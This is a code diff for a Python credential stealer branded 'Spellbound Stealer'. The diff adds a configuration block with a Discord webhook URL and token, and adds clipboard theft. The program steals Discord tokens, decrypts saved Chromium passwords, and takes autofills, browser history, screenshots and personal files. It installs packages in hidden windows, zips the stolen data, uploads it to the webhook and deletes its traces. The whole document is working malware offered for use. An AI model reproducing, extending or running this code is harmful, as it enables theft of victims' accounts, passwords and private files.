@@ -1,3 +1,16 @@
+CONFIG = {
+    "webhook": "https://discord.com/api/webhooks/1343173600454377482/X4Lv8uWTow9D6662EeSEQoaOvVt0gUe5MLhabEYfVQHjZtoUK2amRVPfmkscL6Ym2PU5",
+    "discord": True,
+    "passwords": True,
+    "autofills": True,
+    "history": True,
+    "screenshot": True,
+    "file-stealer": True,
+    "anti-spam": False,
+    "clipboard": True,
+    "auto-delete": False
+}
+
 import os
 import re
 import sys
@@ -37,6 +50,8 @@ if not os.path.exists(CHROMIUM_FOLDER_PATH):
     os.mkdir(CHROMIUM_FOLDER_PATH)
 if not os.path.exists(FILES_FOLDER_PATH):
     os.mkdir(FILES_FOLDER_PATH)
+with open(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", "w") as writer:
+    pass
 
 FILE_HEADER = """
 ┌───────────────────────────┐
@@ -49,18 +64,21 @@ FILE_HEADER = """
 class log:
     def error(text):
         print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [ERROR] {text}")
+        with open(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", "a") as writer:
+            writer.write(f"[{time.strftime("%H:%M:%S", time.localtime())}] [ERROR] {text}\n")
     def info(text):
         print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [INFO] {text}")
-    def warning(text):
-        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [WARNING] {text}")
+        with open(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", "a") as writer:
+            writer.write(f"[{time.strftime("%H:%M:%S", time.localtime())}] [INFO] {text}\n")
 
 def InstallPackages(packages):
     for package in packages:
         log.info(f"Installing package {package}")
         subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
-InstallPackages(packages=["requests", "pycryptodome", "pyautogui"])
+InstallPackages(packages=["requests", "pycryptodome", "pyautogui", "pyperclip"])
 import requests
+import pyperclip
 import pyautogui
 from Crypto.Cipher import AES
 
@@ -103,6 +121,18 @@ def AddFolderToZip(zipFile, folderPath, arcBase=""):
             if arcBase:
                 arcname = os.path.join(arcBase, arcname)
             zipFile.write(file_path, arcname)
+
+def GetFolderSize(path):
+    total_size = 0
+    for dirpath, _, filenames in os.walk(path):
+        for f in filenames:
+            fp = os.path.join(dirpath, f)
+            if os.path.exists(fp):
+                total_size += os.path.getsize(fp)
+    return total_size
+
+def AutoDelete():
+    pass
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ============================================================================================= DISCORD ============================================================================================================== #
@@ -201,7 +231,7 @@ def ExtractInfosFromToken():
 
     return final_to_return
 
-def GrabDiscord():
+def DiscordGetTokens():
     for name, path in discordCommonPaths.items():
         if not os.path.exists(path): continue
         _discord = name.replace(" ", "").lower()
@@ -231,17 +261,18 @@ def GrabDiscord():
                                 discordUIDS.append(uid)
 
 
-try:
-    GrabDiscord()
-    
-    tokens = ExtractInfosFromToken()
-    with open(f"{DISCORD_FOLDER_PATH}\\.tokens.txt", "w", encoding="utf-8") as writer:
-        writer.write(FILE_HEADER)
-        for token in tokens:
-            writer.write(token)
-            totalDiscordTokens += 1
-except Exception as e:
-    log.error(f"Unexpected error - Discord : {e}")
+if CONFIG["discord"]:
+    try:
+        DiscordGetTokens()
+        
+        tokens = ExtractInfosFromToken()
+        with open(f"{DISCORD_FOLDER_PATH}\\.tokens.txt", "w", encoding="utf-8") as writer:
+            writer.write(FILE_HEADER)
+            for token in tokens:
+                writer.write(token)
+                totalDiscordTokens += 1
+    except Exception as e:
+        log.error(f"Unexpected error - Discord : {e}")
 
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
@@ -255,7 +286,7 @@ totalPasswords = 0
 totalAutofills = 0
 totalHistory = 0
 
-def DecryptData(data, key):
+def ChromiumDecryptData(data, key):
     try:
         iv = data[3:15]
         data = data[15:]
@@ -286,7 +317,7 @@ def DecryptData(data, key):
             log.error("Function encountered an error : {e}")
             return f"Failed to decrypt data: {e}"
         
-def GrabPasswordChromium():
+def ChromiumGetPassword():
     for browser in chromiumBrowsers:
         KillProcess(browser['taskname'])
         local_state_path = os.path.join(browser['path'], 'Local State')
@@ -334,7 +365,7 @@ def GrabPasswordChromium():
                     origin_url = row[0]
                     username = row[1]
                     encrypted_password = row[2]
-                    password = DecryptData(encrypted_password, decryption_key)
+                    password = ChromiumDecryptData(encrypted_password, decryption_key)
 
                     if username or password:
                         __CHROMIUM_PASSWORDS__.append(
@@ -355,7 +386,7 @@ def GrabPasswordChromium():
                 log.error(f"Error reading passwords for {browser['name']} - {subpath['name']}: {e}")
                 continue
 
-def GrabAutofillChromium():
+def ChromiumGetAutofill():
     for browser in chromiumBrowsers:
         KillProcess(browser["name"])
         browser_path = browser["path"]
@@ -395,7 +426,7 @@ def GrabAutofillChromium():
                 finally:
                     os.remove(temp_copy)
 
-def GrabHistoryChromium():
+def ChromiumGetHistory():
     for browser in chromiumBrowsers:
         KillProcess(browser["name"])
         history_path = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/History"
@@ -408,45 +439,60 @@ def GrabHistoryChromium():
             history_entry = f"Url: {row[0]}\nTitle: {row[1]}\n==============\n"
             __CHROMIUM_HISTORY__.append(history_entry)
 
-try:
-    GrabPasswordChromium()
+if CONFIG["passwords"]:
+    try:
+        ChromiumGetPassword()
 
-    formatted = ""
-    for entry in __CHROMIUM_PASSWORDS__:
-        formatted += (
-            f"URL:            {entry['url']}\n"
-            f"Username:       {entry['username']}\n"
-            f"Password:       {entry['password']}\n"
-            f"==============\n")
-        totalPasswords += 1
+        formatted = ""
+        for entry in __CHROMIUM_PASSWORDS__:
+            formatted += (
+                f"URL:            {entry['url']}\n"
+                f"Username:       {entry['username']}\n"
+                f"Password:       {entry['password']}\n"
+                f"==============\n")
+            totalPasswords += 1
 
-        with open(f"{CHROMIUM_FOLDER_PATH}\\.passwords.txt", "w", encoding="utf-8") as writer:
+            with open(f"{CHROMIUM_FOLDER_PATH}\\.passwords.txt", "w", encoding="utf-8") as writer:
+                writer.write(FILE_HEADER)
+                writer.write(formatted)
+    except Exception as e:
+        log.error(f"Unexpected error - Chromium - Passwords : {e}")
+
+if CONFIG["autofills"]:
+    try:
+        ChromiumGetAutofill()
+
+        with open(f"{CHROMIUM_FOLDER_PATH}\\.autofills.txt", "w", encoding="utf-8") as writer:
             writer.write(FILE_HEADER)
-            writer.write(formatted)
-except Exception as e:
-    log.error(f"Unexpected error - Chromium - Passwords : {e}")
+            for autofill in __CHROMIUM_AUTOFILLS__:
+                writer.write(autofill)
+                totalAutofills += 1
+    except Exception as e:
+        log.error(f"Unexpected error - Chromium - Autofills : {e}")
 
-try:
-    GrabAutofillChromium()
+if CONFIG["history"]:
+    try:
+        ChromiumGetHistory()
 
-    with open(f"{CHROMIUM_FOLDER_PATH}\\.autofills.txt", "w", encoding="utf-8") as writer:
-        writer.write(FILE_HEADER)
-        for autofill in __CHROMIUM_AUTOFILLS__:
-            writer.write(autofill)
-            totalAutofills += 1
-except Exception as e:
-    log.error(f"Unexpected error - Chromium - Autofills : {e}")
+        with open(f"{CHROMIUM_FOLDER_PATH}\\.history.txt", "w", encoding="utf-8") as writer:
+            writer.write(FILE_HEADER)
+            for entry in __CHROMIUM_HISTORY__:
+                writer.write(entry)
+                totalHistory += 1
+    except Exception as e:
+        log.error(f"Unexpected error - Chromium - History : {e}")
 
-try:
-    GrabHistoryChromium()
 
-    with open(f"{CHROMIUM_FOLDER_PATH}\\.history.txt", "w", encoding="utf-8") as writer:
-        writer.write(FILE_HEADER)
-        for entry in __CHROMIUM_HISTORY__:
-            writer.write(entry)
-            totalHistory += 1
-except Exception as e:
-    log.error(f"Unexpected error - Chromium - History : {e}")
+# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
+# ============================================================================================= CLIPBOARD ============================================================================================================== #
+if CONFIG["clipboard"]:
+    try:
+        if pyperclip.paste() != "":
+            with open(f"{CONTAINER_FOLDER_PATH}\\.clipboard.txt", "w", encoding="utf-8") as writer:
+                writer.write(FILE_HEADER)
+                writer.write(subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors="ignore").strip())
+    except Exception as e:
+        log.error(f"Unexpected error - Clipboard : {e}")
 
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
@@ -458,27 +504,29 @@ fileMaxSize = 4194304
 filesToSteal = []
 totalFiles = 0
 
-try:
-    screenshot = pyautogui.screenshot()
-    screenshot.save(f"{FILES_FOLDER_PATH}\\.desktop.png")
-    totalFiles += 1
-except Exception as e:
-    log.error(f"The screenshot encountered an error : {e}")
+if CONFIG["screenshot"]:
+    try:
+        screenshot = pyautogui.screenshot()
+        screenshot.save(f"{CONTAINER_FOLDER_PATH}\\.desktop.png")
+        totalFiles += 1
+    except Exception as e:
+        log.error(f"The screenshot encountered an error : {e}")
 
-for path in fileStealerPaths:
-    files = ListFileInDir(path)
-    
-    for file in files:
-        if os.path.getsize(file) < fileMaxSize:
-            file_name = os.path.basename(file)
+if CONFIG["file-stealer"]:
+    for path in fileStealerPaths:
+        files = ListFileInDir(path)
+        
+        for file in files:
+            if os.path.getsize(file) < fileMaxSize:
+                file_name = os.path.basename(file)
 
-            if any(file_name.endswith(ext) for ext in fileStealerExtensions) or any(name in file_name for name in fileStealerName):
-                filesToSteal.append(file)
+                if any(file_name.endswith(ext) for ext in fileStealerExtensions) or any(name in file_name for name in fileStealerName):
+                    filesToSteal.append(file)
 
-for file in filesToSteal:
-    destination = f"{FILES_FOLDER_PATH}\\{os.path.basename(file)}"
-    shutil.copy(file, destination)
-    totalFiles += 1
+    for file in filesToSteal:
+        destination = f"{FILES_FOLDER_PATH}\\{os.path.basename(file)}"
+        shutil.copy(file, destination)
+        totalFiles += 1
 
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
@@ -502,33 +550,46 @@ org = data.get('org')
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ============================================================================================= BUILD ZIP ============================================================================================================ #
 with zipfile.ZipFile(ZIP_PATH, "w") as zip_file:
-    AddFolderToZip(zip_file, DISCORD_FOLDER_PATH, arcBase="Discord")
-    AddFolderToZip(zip_file, CHROMIUM_FOLDER_PATH, arcBase="Chromium Browsers")
-    AddFolderToZip(zip_file, FILES_FOLDER_PATH, arcBase="Files")
+    zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", arcname=".execution logs.txt")
+    if CONFIG["screenshot"]: zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.desktop.png", arcname=".desktop.png")
+    if CONFIG["discord"]: AddFolderToZip(zip_file, DISCORD_FOLDER_PATH, arcBase="Discord")
+    if CONFIG["passwords"] or CONFIG["autofills"] or CONFIG["history"]: AddFolderToZip(zip_file, CHROMIUM_FOLDER_PATH, arcBase="Chromium Browsers")
+    if CONFIG["file-stealer"]: AddFolderToZip(zip_file, FILES_FOLDER_PATH, arcBase="Files")
+    if CONFIG["clipboard"]: zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.clipboard.txt", arcname=".clipboard.txt")
 
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ============================================================================================= SEND DATA ============================================================================================================ #
+blue = "[2;45m[0m[2;45m[0m[2;35m"
+purple = "[2;34m"
+reset = "[0m"
+
 embed = {
     "title": "Spellbound Stealer",
     "color": 0,
     "fields": [
-        {"name": ":computer: __System Infos__", "value": f"```ansi\n[2;45m[0m[2;45m[0m[2;35mSession[0m : {session}\n[2;45m[0m[2;45m[0m[2;35mComputer Name[0m : {computer_name}\n[2;45m[0m[2;45m[0m[2;35mOS[0m : {osVersion}\n[2;45m[0m[2;45m[0m[2;35mArchitecture[0m : {architecture}\n[2;45m[0m[2;45m[0m[2;35mMAC[0m : {mac}\n[2;45m[0m[2;45m[0m[2;35mIP[0m : {ip}\n[2;45m[0m[2;45m[0m[2;35mCountry[0m : {country}\n[2;45m[0m[2;45m[0m[2;35mRegion[0m : {region}\n[2;45m[0m[2;45m[0m[2;35mCity[0m : {city}\n[2;45m[0m[2;45m[0m[2;35mLocalisation[0m : {loc}\n[2;45m[0m[2;45m[0m[2;35mInternet Provider[0m : {org}```", "inline": False},
-        {"name": ":identification_card: __User Infos__", "value": f"```ansi\n[2;34mDiscord Account[0m : {totalDiscordTokens}\n[2;34mPasswords[0m : {totalPasswords}\n[2;34mAuto-fills[0m : {totalAutofills}\n[2;34mHistory[0m : {totalHistory}\n[2;34mStolen Files[0m : {totalFiles}```", "inline": False},
+        {"name": ":computer: __System Infos__", "value": f"```ansi\n{blue}Session{reset} : {session}\n{blue}Computer Name{reset} : {computer_name}\n{blue}OS{reset} : {osVersion}\n{blue}Architecture{reset} : {architecture}\n{blue}MAC{reset} : {mac}\n{blue}CPU{reset} : {subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().split('\n')[2]}\n{blue}IP{reset} : {ip}\n{blue}Country{reset} : {country}\n{blue}Region{reset} : {region}\n{blue}City{reset} : {city}\n{blue}Localisation{reset} : {loc}\n{blue}Internet Provider{reset} : {org}```", "inline": False},
+        {"name": ":identification_card: __User Infos__", "value": f"```ansi\n{purple}Discord Account{reset} : {totalDiscordTokens}\n{purple}Passwords{reset} : {totalPasswords}\n{purple}Auto-fills{reset} : {totalAutofills}\n{purple}History{reset} : {totalHistory}\n{purple}Stolen Files{reset} : {totalFiles}```", "inline": False},
     ],
     "footer": {"text": "Grabbed by Spellbound"}
 }
 payload = {"embeds": [embed]}
 
-url = "https://discord.com/api/webhooks/1343173600454377482/X4Lv8uWTow9D6662EeSEQoaOvVt0gUe5MLhabEYfVQHjZtoUK2amRVPfmkscL6Ym2PU5"
 with open(ZIP_PATH, "rb") as zipFileToSend:
     fileReady = {"file": zipFileToSend}
     try:
-        res = requests.post(url, files=fileReady, data={"payload_json": json.dumps(payload)})
+        res = requests.post(CONFIG["webhook"], files=fileReady, data={"payload_json": json.dumps(payload)})
     except Exception as e:
         log.error("Error with the webhook")
 
 SafeRemove(ZIP_PATH)
+SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.desktop.png")
+SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt")
+SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.clipboard.txt")
 shutil.rmtree(DISCORD_FOLDER_PATH)
 shutil.rmtree(CHROMIUM_FOLDER_PATH)
 shutil.rmtree(FILES_FOLDER_PATH)
+
+if CONFIG["auto-delete"]:
+    if not "Spellbound" in __file__ or not "Developements" in __file__:
+        AutoDelete()
